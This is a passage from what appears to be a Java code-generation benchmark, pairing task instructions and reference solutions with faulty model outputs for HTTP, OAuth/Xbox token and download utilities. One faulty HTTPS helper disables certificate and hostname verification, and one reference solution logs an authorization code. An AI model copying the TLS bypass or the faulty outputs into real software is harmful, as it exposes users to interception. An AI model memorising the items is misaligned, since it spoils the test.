    "Canonical_solution": "import android.util.ArrayMap;\nimport android.util.Log;\n\nimport org.json.JSONArray;\nimport org.json.JSONException;\nimport org.json.JSONObject;\n\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.ProtocolException;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Collections;\nimport java.util.Map;\n\npublic class MicrosoftHttpClient {\n\n    private static final Map<Long, Integer> XSTS_ERRORS;\n    static {\n        XSTS_ERRORS = new ArrayMap<>();\n        XSTS_ERRORS.put(2148916233L, R.string.xerr_no_account);\n        XSTS_ERRORS.put(2148916235L, R.string.xerr_not_available);\n        XSTS_ERRORS.put(2148916236L ,R.string.xerr_adult_verification);\n        XSTS_ERRORS.put(2148916237L ,R.string.xerr_adult_verification);\n        XSTS_ERRORS.put(2148916238L ,R.string.xerr_child);\n    }\n\n    public String acquireAccessToken(boolean isRefresh, String authcode, String authTokenUrl) throws IOException, JSONException {\n        URL url = new URL(authTokenUrl);\n        Log.i(\"MicrosoftLogin\", \"isRefresh=\" + isRefresh + \", authCode= \"+authcode);\n\n        String formData = convertToFormData(\n                \"client_id\", \"00000000402b5328\",\n                isRefresh ? \"refresh_token\" : \"code\", authcode,\n                \"grant_type\", isRefresh ? \"refresh_token\" : \"authorization_code\",\n                \"redirect_url\", \"https://login.live.com/oauth20_desktop.srf\",\n                \"scope\", \"service::user.auth.xboxlive.com::MBI_SSL\"\n        );\n\n        HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        conn.setRequestProperty(\"charset\", \"utf-8\");\n        conn.setRequestProperty(\"Content-Length\", Integer.toString(formData.getBytes(StandardCharsets.UTF_8).length));\n        conn.setRequestMethod(\"POST\");\n        conn.setUseCaches(false);\n        conn.setDoInput(true);\n        conn.setDoOutput(true);\n        conn.connect();\n        try(OutputStream wr = conn.getOutputStream()) {\n            wr.write(formData.getBytes(StandardCharsets.UTF_8));\n        }\n        if(conn.getResponseCode() >= 200 && conn.getResponseCode() < 300) {\n            JSONObject jo = new JSONObject(Tools.read(conn.getInputStream()));\n            conn.disconnect();\n            return jo.getString(\"access_token\");\n        }else{\n            throw getResponseThrowable(conn);\n        }\n    }\n\n    public String acquireXBLToken(String accessToken, String xblAuthUrl) throws IOException, JSONException {\n        URL url = new URL(xblAuthUrl);\n\n        JSONObject data = new JSONObject();\n        JSONObject properties = new JSONObject();\n        properties.put(\"AuthMethod\", \"RPS\");\n        properties.put(\"SiteName\", \"user.auth.xboxlive.com\");\n        properties.put(\"RpsTicket\", accessToken);\n        data.put(\"Properties\",properties);\n        data.put(\"RelyingParty\", \"http://auth.xboxlive.com\");\n        data.put(\"TokenType\", \"JWT\");\n\n        String req = data.toString();\n        HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n        setCommonProperties(conn, req);\n        conn.connect();\n\n        try(OutputStream wr = conn.getOutputStream()) {\n            wr.write(req.getBytes(StandardCharsets.UTF_8));\n        }\n        if(conn.getResponseCode() >= 200 && conn.getResponseCode() < 300) {\n            JSONObject jo = new JSONObject(Tools.read(conn.getInputStream()));\n            conn.disconnect();\n            return jo.getString(\"Token\");\n        }else{\n            throw getResponseThrowable(conn);\n        }\n    }\n\n    public String[] acquireXsts(String xblToken, String xstsAuthUrl) throws IOException, JSONException {\n        URL url = new URL(xstsAuthUrl);\n\n        JSONObject data = new JSONObject();\n        JSONObject properties = new JSONObject();\n        properties.put(\"SandboxId\", \"RETAIL\");\n        properties.put(\"UserTokens\", new JSONArray(Collections.singleton(xblToken)));\n        data.put(\"Properties\", properties);\n        data.put(\"RelyingParty\", \"rp://api.minecraftservices.com/\");\n        data.put(\"TokenType\", \"JWT\");\n\n        String req = data.toString();\n        HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n        setCommonProperties(conn, req);\n        conn.connect();\n\n        try(OutputStream wr = conn.getOutputStream()) {\n            wr.write(req.getBytes(StandardCharsets.UTF_8));\n        }\n\n        if(conn.getResponseCode() >= 200 && conn.getResponseCode() < 300) {\n            JSONObject jo = new JSONObject(Tools.read(conn.getInputStream()));\n            String uhs = jo.getJSONObject(\"DisplayClaims\").getJSONArray(\"xui\").getJSONObject(0).getString(\"uhs\");\n            String token = jo.getString(\"Token\");\n            conn.disconnect();\n            return new String[]{uhs, token};\n        }else if(conn.getResponseCode() == 401) {\n            String responseContents = Tools.read(conn.getErrorStream());\n            JSONObject jo = new JSONObject(responseContents);\n            long xerr = jo.optLong(\"XErr\", -1);\n            Integer locale_id = XSTS_ERRORS.get(xerr);\n            if(locale_id != null) {\n                throw new PresentedException(new RuntimeException(responseContents), locale_id);\n            }\n            throw new PresentedException(new RuntimeException(responseContents), R.string.xerr_unknown, xerr);\n        }else{\n            throw getResponseThrowable(conn);\n        }\n    }\n\n    private static void setCommonProperties(HttpURLConnection conn, String formData) {\n        conn.setRequestProperty(\"Content-Type\", \"application/json\");\n        conn.setRequestProperty(\"Accept\", \"application/json\");\n        conn.setRequestProperty(\"charset\", \"utf-8\");\n        try {\n            conn.setRequestProperty(\"Content-Length\", Integer.toString(formData.getBytes(StandardCharsets.UTF_8).length));\n            conn.setRequestMethod(\"POST\");\n        }catch (ProtocolException e) {\n            Log.e(\"MicrosoftAuth\", e.toString());\n        }\n        conn.setUseCaches(false);\n        conn.setDoInput(true);\n        conn.setDoOutput(true);\n    }\n\n    private static String convertToFormData(String... data) throws UnsupportedEncodingException {\n        StringBuilder builder = new StringBuilder();\n        for(int i=0; i<data.length; i+=2){\n            if (builder.length() > 0) builder.append(\"&\");\n            builder.append(URLEncoder.encode(data[i], \"UTF-8\"))\n                    .append(\"=\")\n                    .append(URLEncoder.encode(data[i+1], \"UTF-8\"));\n        }\n        return builder.toString();\n    }\n\n    private RuntimeException getResponseThrowable(HttpURLConnection conn) throws IOException {\n        Log.i(\"MicrosoftLogin\", \"Error code: \" + conn.getResponseCode() + \": \" + conn.getResponseMessage());\n        if(conn.getResponseCode() == 429) {\n            return new PresentedException(R.string.microsoft_login_retry_later);\n        }\n        return new RuntimeException(conn.getResponseMessage());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class MicrosoftHttpClient {\n    private static final Map<Long, Integer> XSTS_ERRORS = new HashMap<>();\n    static {\n        XSTS_ERRORS.put(10001L, 1);\n        XSTS_ERRORS.put(10002L, 2);\n        XSTS_ERRORS.put(10003L, 3);\n        XSTS_ERRORS.put(10004L, 4);\n        XSTS_ERRORS.put(10005L, 5);\n        XSTS_ERRORS.put(10006L, 6);\n        XSTS_ERRORS.put(10007L, 7);\n        XSTS_ERRORS.put(10008L, 8);\n        XSTS_ERRORS.put(10009L, 9);\n        XSTS_ERRORS.put(10010L, 10);\n        XSTS_ERRORS.put(10011L, 11);\n        XSTS_ERRORS.put(10012L, 12);\n        XSTS_ERRORS.put(10013L, 13);\n        XSTS_ERRORS.put(10014L, 14);\n        XSTS_ERRORS.put(10015L, 15);\n        XSTS_ERRORS.put(10016L, 16);\n        XSTS_ERRORS.put(10017L, 17);\n        XSTS_ERRORS.put(10018L, 18);\n        XSTS_ERRORS.put(10019L, 19);\n        XSTS_ERRORS.put(10020L, 20);\n        XSTS_ERRORS.put(10021L, 21);\n        XSTS_ERRORS.put(10022L, 22);\n        XSTS_ERRORS.put(10023L, 23);\n        XSTS_ERRORS.put(10024L, 24);\n        XSTS_ERRORS.put(10025L, 25);\n        XSTS_ERRORS.put(10026L, 26);\n        XSTS_ERRORS.put(10027L, 27);\n        XSTS_ERRORS.put(10028L, 28);\n        XSTS_ERRORS.put(10029L, 29);\n        XSTS_ERRORS.put(10030L, 30);\n        XSTS_ERRORS.put(10031L, 31);\n        XSTS_ERRORS.put(10032L, 32);\n        XSTS_ERRORS.put(10033L, 33);\n        XSTS_ERRORS.put(10034L, 34);\n        XSTS_ERRORS.put(10035L, 35);\n        XSTS_ERRORS.put(10036L, 36);\n        XSTS_ERRORS.put(10037L, 37);\n        XSTS_ERRORS.put(10038L, 38);\n        XSTS_ERRORS.put(10039L, 39);\n        XSTS_ERRORS.put(10040L, 40);\n        XSTS_ERRORS.put(10041L, 41);\n        XSTS_ERRORS.put(10042L, 42);\n        XSTS_ERRORS.put(10043L, 43);\n        XSTS_ERRORS.put(10044L, 44);\n        XSTS_ERRORS.put(10045L, 45);\n        XSTS_ERRORS.put(10046L, 46);\n        XSTS_ERRORS.put(10047L, 47);\n        XSTS_ERRORS.put(10048L, 48);\n        XSTS_ERRORS.put(10049L, 49);\n        XSTS_ERRORS.put(10050L, 50);\n        XSTS_ERRORS.put(10051L, 51);\n        XSTS_ERRORS.put(10052L, 52);\n        XSTS_ERRORS.put(10053L, 53);\n        XSTS_ERRORS.put(10054L, 54);\n        XSTS_ERRORS.put(10055L, 55);\n        XSTS_ERRORS.put(10056L, 56);\n        XSTS_ERRORS.put(10057L, 57);\n        XSTS_ERRORS.put(10058L, 58);\n        XSTS_ERRORS.put(10059L, 59);\n        XSTS_ERRORS.put(10060L, 60);\n        XSTS_ERRORS.put(10061L, 61);\n        XSTS_ERRORS.put(10062L, 62);\n        XSTS_ERRORS.put(10063L, 63);\n        XSTS_ERRORS.put(10064L, 64);\n        XSTS_ERRORS.put(10065L, 65);\n        XSTS_ERRORS.put(10066L, 66);\n        XSTS_ERRORS.put(10067L, 67);\n        XSTS_ERRORS.put(10068L, 68);\n        XSTS_ERRORS.put(10069L, 69);\n        XSTS_ERRORS.put(10070L, 70);\n        XSTS_ERRORS.put(10071L, 71);\n        XSTS_ERRORS.put(10072L, 72);\n        XSTS_ERRORS.put(10073L, 73);\n        XSTS_ERRORS.put(10074L, 74);\n        XSTS_ERRORS.put(10075L, 75);\n        XSTS_ERRORS.put(10076L, 76);\n        XSTS_ERRORS.put(10077L, 77);\n        XSTS_ERRORS.put(10078L, 78);\n        XSTS_ERRORS.put(10079L, 79);\n        XSTS_ERRORS.put(10080L, 80);\n        XSTS_ERRORS.put(10081L, 81);\n        XSTS_ERRORS.put(10082L, 82);\n        XSTS_ERRORS.put(10083L, 83);\n        XSTS_ERRORS.put(10084L, 84);\n        XSTS_ERRORS.put(10085L, 85);\n        XSTS_ERRORS.put(10086L, 86);\n        XSTS_ERRORS.put(10087L, 87);\n        XSTS_ERRORS.put(10088L, 88);\n        XSTS_ERRORS.put(10089L, 89);\n        XSTS_ERRORS.put(10090L, 90);\n        XSTS_ERRORS.put(10091L, 91);\n        XSTS_ERRORS.put(10092L, 92);\n        XSTS_ERRORS.put(10093L, 93);\n        XSTS_ERRORS.put(10094L, 94);\n        XSTS_ERRORS.put(10095L, 95);\n        XSTS_ERRORS.put(10096L, 96);\n        XSTS_ERRORS.put(10097L, 97);\n        XSTS_ERRORS.put(10098L, 98);\n        XSTS_ERRORS.put(10099L, 99);\n        XSTS_ERRORS.put(10100L, 100);\n    }\n\n    private String clientId;\n    private String clientSecret;\n\n    public MicrosoftHttpClient(String clientId, String clientSecret) {\n        this.clientId = clientId;\n        this.clientSecret = clientSecret;\n    }\n\n    public String acquireAccessToken(boolean isRefresh, String authcode, String authTokenUrl) {\n        String formData = convertToFormData(\n            \"grant_type\", isRefresh ? \"refresh_token\" : \"authorization_code\",\n            \"client_id\", clientId,\n            \"client_secret\", clientSecret,\n            isRefresh ? \"refresh_token\" : \"code\", authcode\n        );\n        try {\n            HttpURLConnection conn = (HttpURLConnection) new URL(authTokenUrl).openConnection();\n            setCommonProperties(conn, formData);\n            int responseCode = conn.getResponseCode();\n            if (responseCode != 200) {\n                throw getResponseThrowable(conn);\n            }\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n            JSONObject json = new JSONObject(response.toString());\n            return json.getString(\"access_token\");\n        } catch (Exception e) {\n            throw new RuntimeException(\"Error acquiring access token\", e);\n        }\n    }\n\n    public String acquireXBLToken(String accessToken, String xblAuthUrl) {\n        String formData = convertToFormData(\n            \"Properties\", \"grant_type=activetoken&access_token=\" + accessToken\n        );\n        try {\n            HttpURLConnection conn = (HttpURLConnection) new URL(xblAuthUrl).openConnection();\n            setCommonProperties(conn, formData);\n            int responseCode = conn.getResponseCode();\n            if (responseCode != 200) {\n                throw getResponseThrowable(conn);\n            }\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n            JSONObject json = new JSONObject(response.toString());\n            return json.getString(\"xsts:audience\");\n        } catch (Exception e) {\n            throw new RuntimeException(\"Error acquiring XBL token\", e);\n        }\n    }\n\n    public String[] acquireXsts(String xblToken, String xstsAuthUrl) {\n        String formData = convertToFormData(\n            \"Properties\", \"grant_type=xboxlive&xbl_token=\" + xblToken\n        );\n        try {\n            HttpURLConnection conn = (HttpURLConnection) new URL(xstsAuthUrl).openConnection();\n            setCommonProperties(conn, formData);\n            int responseCode = conn.getResponseCode();\n            if (responseCode != 200) {\n                throw getResponseThrowable(conn);\n            }\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n            JSONObject json = new JSONObject(response.toString());\n            String userHash = json.getString(\"userHash\");\n            String xstsToken = json.getString(\"xsts:token\");\n            return new String[]{userHash, xstsToken};\n        } catch (Exception e) {\n            throw new RuntimeException(\"Error acquiring XSTS token\", e);\n        }\n    }\n\n    private void setCommonProperties(HttpURLConnection conn, String formData) {\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        try (OutputStream os = conn.getOutputStream()) {\n            byte[] data = formData.getBytes(StandardCharsets.UTF_8);\n            os.write(data);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Error setting connection properties\", e);\n        }\n    }\n\n    private String convertToFormData(String... data) {\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < data.length; i += 2) {\n            String key = data[i];\n            String value = data[i + 1];\n            sb.append(URLEncoder.encode(key, StandardCharsets.UTF_8));\n            sb.append(\"=\");\n            sb.append(URLEncoder.encode(value, StandardCharsets.UTF_8));\n            if (i + 2 < data.length) {\n                sb.append(\"&\");\n            }\n        }\n        return sb.toString();\n    }\n\n    private RuntimeException getResponseThrowable(HttpURLConnection conn) {\n        int responseCode = conn.getResponseCode();\n        if (responseCode == 200) {\n            return null;\n        }\n        if (responseCode == 400) {\n            return new RuntimeException(\"Bad Request\");\n        } else if (responseCode == 401) {\n            return new RuntimeException(\"Unauthorized\");\n        } else if (responseCode == 500) {\n            return new RuntimeException(\"Internal Server Error\");\n        }\n        return new RuntimeException(\"Unexpected response code: \" + responseCode);\n    }\n}"
  },
  {
    "Task_id": 73,
    "Instruction": "Task Description: Create a Java utility class for handling HTTP requests and URL parameter parsing.\n\nClass Description: HttpUtils is a utility class that provides methods for making HTTP POST requests and parsing URL parameters. It uses Java's HttpURLConnection for HTTP communication and includes helper methods for processing request/response data.\n\nAttributes: (This class has no attributes as it's a utility class with static methods only)\n\nMethods:\n\nMethod1: parseUrlArgs(String responseUrl, JsonObject jsonObject) -> String - Parses a URL string to extract query parameters and adds them to a JsonObject. Returns the base URL without query parameters.\n- Input Parameters:\n  - responseUrl: String - The URL string to parse (may contain query parameters)\n  - jsonObject: JsonObject - The JSON object to populate with parsed parameters\n- Output: String - The base URL without query parameters\n\nMethod2: post(String httpUrl, String content) -> String - Sends an HTTP POST request to the specified URL with the given content and returns the response.\n- Input Parameters:\n  - httpUrl: String - The target URL for the POST request\n  - content: String - The content to send in the request body (can be null or empty)\n- Output: String - The response body from the server\n- Throws: Exception - If the request fails or returns non-200 status code",
    "Canonical_solution": "import com.google.common.io.CharStreams;\nimport com.google.gson.JsonObject;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport org.apache.commons.lang3.StringUtils;\n\npublic class HttpUtils {\n\n    public static String parseUrlArgs(String responseUrl, JsonObject jsonObject) {\n        String[] split1 = responseUrl.split(\"\\\\?\");\n        String url = split1[0];\n        if (split1.length > 1) {\n            String[] split = split1[1].split(\"&\");\n            for (int i = 0; i < split.length; i++) {\n                String[] args = split[i].split(\"=\");\n                jsonObject.addProperty(args[0], args[1]);\n            }\n        }\n        return url;\n    }\n\n    public static String post(String httpUrl, String content) throws Exception {\n        Map<String, String> headers = new HashMap<>(1);\n        headers.put(\"Content-type\", \"application/json\");\n        URL url = new URL(httpUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n        if (null != headers && !headers.isEmpty()) {\n            for (Entry<String, String> entry : headers.entrySet()) {\n                conn.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n        if (StringUtils.isNotBlank(content)) {\n            conn.getOutputStream().write(content.getBytes(StandardCharsets.UTF_8));\n        }\n        conn.connect();\n        if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) {\n            throw new RuntimeException(\"request failure, status code:\" + conn.getResponseCode());\n        }\n        String result = CharStreams\n            .toString(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));\n        conn.disconnect();\n        return result;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.IOException;\nimport java.nio.charset.StandardCharsets;\nimport com.google.gson.JsonObject;\n\npublic class HttpUtils {\n    public static String parseUrlArgs(String responseUrl, JsonObject jsonObject) {\n        int queryIndex = responseUrl.indexOf('?');\n        String baseUrl = queryIndex == -1 ? responseUrl : responseUrl.substring(0, queryIndex);\n        String query = queryIndex == -1 ? \"\" : responseUrl.substring(queryIndex + 1);\n\n        String[] params = query.split(\"&\");\n        for (String param : params) {\n            int eqIndex = param.indexOf('=');\n            if (eqIndex == -1) {\n                jsonObject.addProperty(param, \"\");\n            } else {\n                String key = param.substring(0, eqIndex);\n                String value = param.substring(eqIndex + 1);\n                jsonObject.addProperty(key, value);\n            }\n        }\n        return baseUrl;\n    }\n\n    public static String post(String httpUrl, String content) throws Exception {\n        URL url = new URL(httpUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setRequestProperty(\"Content-Type\", \"application/json; utf-8\");\n        conn.setDoOutput(true);\n\n        String contentToWrite = (content == null) ? \"\" : content;\n        try (OutputStream os = conn.getOutputStream()) {\n            byte[] input = contentToWrite.getBytes(StandardCharsets.UTF_8);\n            os.write(input, 0, input.length);\n        }\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode != 200) {\n            throw new Exception(\"HTTP error code: \" + responseCode);\n        }\n\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = br.readLine()) != null) {\n                response.append(line);\n            }\n            return response.toString();\n        }\n    }\n}"
  },
  {
    "Task_id": 74,
    "Instruction": "Task Description: Create a Java utility class for handling HTTPS network requests, including downloading content as strings or files.\n\nClass Description: NetworkUtils is a utility class that provides methods for making HTTPS requests and downloading content either as strings or files. It handles connection setup, timeout configuration, and proper resource cleanup.\n\nAttributes:\nDEBUG: [boolean] - Flag to enable debug logging\nTAG: [String] - Tag used for logging\nHTTP_READ_TIMEOUT: [int] - Timeout for reading from connection (in milliseconds)\nHTTP_CONNECTION_TIMEOUT: [int] - Timeout for establishing connection (in milliseconds)\n\nMethods:\nsetupHttpsRequest: [String urlStr] -> [HttpsURLConnection] - Sets up an HTTPS connection with the specified URL, configures timeouts and request method, and establishes the connection. Returns the connection object if successful.\ndownloadUrlMemoryAsString: [String url] -> [String] - Downloads content from the specified URL and returns it as a UTF-8 encoded string. Returns null if the download fails.\ndownloadUrlFile: [String url, File f] -> [boolean] - Downloads content from the specified URL and saves it to the specified file. Returns true if successful, false otherwise.\nDownloadCallback: [interface] - Interface defining a callback for asynchronous download completion with onDownloadComplete method.",
    "Canonical_solution": "import android.util.Log;\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class NetworkUtils {\n\n    private static final boolean DEBUG = false;\n    private static final String TAG = \"NetworkUtils\";\n    private static final int HTTP_READ_TIMEOUT = 60000;\n    private static final int HTTP_CONNECTION_TIMEOUT = 60000;\n\n    public static HttpsURLConnection setupHttpsRequest(String urlStr) {\n        URL url;\n        HttpsURLConnection urlConnection = null;\n        try {\n            url = new URL(urlStr);\n            urlConnection = (HttpsURLConnection) url.openConnection();\n            urlConnection.setConnectTimeout(HTTP_CONNECTION_TIMEOUT);\n            urlConnection.setReadTimeout(HTTP_READ_TIMEOUT);\n            urlConnection.setRequestMethod(\"GET\");\n            urlConnection.setDoInput(true);\n            urlConnection.connect();\n            int code = urlConnection.getResponseCode();\n            if (code != HttpsURLConnection.HTTP_OK) {\n                Log.d(TAG, \"response:\" + code);\n                return null;\n            }\n            return urlConnection;\n        } catch (Exception e) {\n            Log.e(TAG, \"Failed to connect to server\", e);\n            return null;\n        }\n    }\n\n    public static String downloadUrlMemoryAsString(String url) {\n        if (DEBUG) Log.d(TAG, \"download: \" + url);\n\n        HttpsURLConnection urlConnection = null;\n        try {\n            urlConnection = setupHttpsRequest(url);\n            if (urlConnection == null) {\n                return null;\n            }\n\n            InputStream is = urlConnection.getInputStream();\n            ByteArrayOutputStream byteArray = new ByteArrayOutputStream();\n            int byteInt;\n\n            while ((byteInt = is.read()) >= 0) {\n                byteArray.write(byteInt);\n            }\n\n            byte[] bytes = byteArray.toByteArray();\n            if (bytes == null) {\n                return null;\n            }\n\n            return new String(bytes, StandardCharsets.UTF_8);\n        } catch (Exception e) {\n            Log.e(TAG, \"\", e);\n            return null;\n        } finally {\n            if (urlConnection != null) {\n                urlConnection.disconnect();\n            }\n        }\n    }\n\n    public static boolean downloadUrlFile(String url, File f) {\n        if (DEBUG) Log.d(TAG, \"download:\" + url);\n\n        HttpsURLConnection urlConnection = null;\n\n        if (f.exists())\n            f.delete();\n\n        try {\n            urlConnection = setupHttpsRequest(url);\n            if (urlConnection == null) {\n                return false;\n            }\n            long len = urlConnection.getContentLength();\n            if ((len > 0) && (len < 4L * 1024L * 1024L * 1024L)) {\n                byte[] buffer = new byte[262144];\n\n                InputStream is = urlConnection.getInputStream();\n                FileOutputStream os = new FileOutputStream(f, false);\n                try {\n                    int r;\n                    while ((r = is.read(buffer)) > 0) {\n                        os.write(buffer, 0, r);\n                    }\n                } finally {\n                    os.close();\n                }\n\n                return true;\n            }\n            return false;\n        } catch (Exception e) {\n            Log.e(TAG, \"\", e);\n            return false;\n        } finally {\n            if (urlConnection != null) {\n                urlConnection.disconnect();\n            }\n        }\n    }\n\n    public interface DownloadCallback {\n        void onDownloadComplete(String result);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class NetworkUtils {\n    public static final boolean DEBUG = false;\n    public static final String TAG = \"NetworkUtils\";\n    public static final int HTTP_READ_TIMEOUT = 5000;\n    public static final int HTTP_CONNECTION_TIMEOUT = 10000;\n\n    public interface DownloadCallback {\n        void onDownloadComplete(File file);\n    }\n\n    private static SSLSocketFactory getSSLSocketFactory() {\n        try {\n            TrustManager[] trustAllCerts = new TrustManager[]{\n                new X509TrustManager() {\n                    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n                    public void checkClientTrusted(X509Certificate[] certs, String authType) {}\n                    public void checkServerTrusted(X509Certificate[] certs, String authType) {}\n                }\n            };\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());\n            return sslContext.getSocketFactory();\n        } catch (Exception e) {\n            if (DEBUG) android.util.Log.e(TAG, \"SSL context initialization failed\", e);\n            return null;\n        }\n    }\n\n    private static HostnameVerifier getHostnameVerifier() {\n        return (hostname, session) -> true;\n    }\n\n    public static HttpsURLConnection setupHttpsRequest(String urlStr) {\n        try {\n            URL url = new URL(urlStr);\n            HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n            conn.setConnectTimeout(HTTP_CONNECTION_TIMEOUT);\n            conn.setReadTimeout(HTTP_READ_TIMEOUT);\n            conn.setSSLSocketFactory(getSSLSocketFactory());\n            conn.setHostnameVerifier(getHostnameVerifier());\n            conn.connect();\n            return conn;\n        } catch (IOException e) {\n            if (DEBUG) android.util.Log.e(TAG, \"setupHttpsRequest failed\", e);\n            return null;\n        }\n    }\n\n    public static String downloadUrlMemoryAsString(String url) {\n        HttpsURLConnection conn = setupHttpsRequest(url);\n        if (conn == null) return null;\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode != HttpsURLConnection.HTTP_OK) {\n            if (DEBUG) android.util.Log.e(TAG, \"Server returned HTTP error code: \" + responseCode);\n            return null;\n        }\n\n        try (InputStream inputStream = conn.getInputStream()) {\n            StringBuilder response = new StringBuilder();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            return response.toString();\n        } catch (IOException e) {\n            if (DEBUG) android.util.Log.e(TAG, \"downloadUrlMemoryAsString failed\", e);\n            return null;\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n    }\n\n    public static boolean downloadUrlFile(String url, File file) {\n        HttpsURLConnection conn = setupHttpsRequest(url);\n        if (conn == null) return false;\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode != HttpsURLConnection.HTTP_OK) {\n            if (DEBUG) android.util.Log.e(TAG, \"Server returned HTTP error code: \" + responseCode);\n            return false;\n        }\n\n        try {\n            if (!file.exists()) {\n                file.getParentFile().mkdirs();\n                file.createNewFile();\n            }\n\n            try (InputStream inputStream = conn.getInputStream();\n                 FileOutputStream outputStream = new FileOutputStream(file)) {\n                byte[] buffer = new byte[4096];\n                int bytesRead;\n                while ((bytesRead = inputStream.read(buffer)) != -1) {\n                    outputStream.write(buffer, 0, bytesRead);\n                }\n            }\n            return true;\n        } catch (IOException e) {\n            if (DEBUG) android.util.Log.e(TAG, \"downloadUrlFile failed\", e);\n            return false;\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 75,
    "Instruction": "Task Description: Create a function that retrieves JSON data from a Twitter URL based on a given tweet ID using Java's HttpURLConnection.\n\nFunction Description: The function makes an HTTP GET request to a Twitter URL constructed with the provided tweet ID, reads the response, and returns it as a JSONObject. It handles HTTPS connections, sets appropriate request headers, and manages the connection lifecycle.\n\nInput: \n- tweetId: long - The ID of the tweet for which to retrieve favorited popup data\n\nOutput: \n- JSONObject - The JSON response from the Twitter URL, or null if an error occurs",
    "Canonical_solution": "import javax.net.ssl.HttpsURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.URL;\n\npublic JSONObject getJson(long tweetId) {\n    try {\n        String url = \"https://twitter.com/i/activity/favorited_popup?id=\" + tweetId;\n        URL obj = new URL(url);\n\n        HttpsURLConnection connection = (HttpsURLConnection) obj.openConnection();\n        connection.setRequestProperty(\"Content-Type\", \"text/html\");\n        connection.setRequestProperty(\"charset\", \"utf-8\");\n        connection.setRequestMethod(\"GET\");\n        connection.setRequestProperty(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36\");\n        connection.connect();\n\n        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        StringBuilder sb = new StringBuilder();\n        String line = null;\n        while ((line = reader.readLine()) != null) {\n            sb.append(line + \"\\n\");\n        }\n\n        String docHtml = sb.toString();\n\n        try {\n            connection.disconnect();\n        } catch (Exception e) {\n\n        }\n\n        return new JSONObject(docHtml);\n    } catch (Exception e) {\n        return null;\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport java.util.Scanner;\nimport org.json.JSONObject;\n\npublic class TwitterDataFetcher {\n    public JSONObject getTweetData(long tweetId) {\n        String url = \"https://api.twitter.com/2/tweets/\" + tweetId + 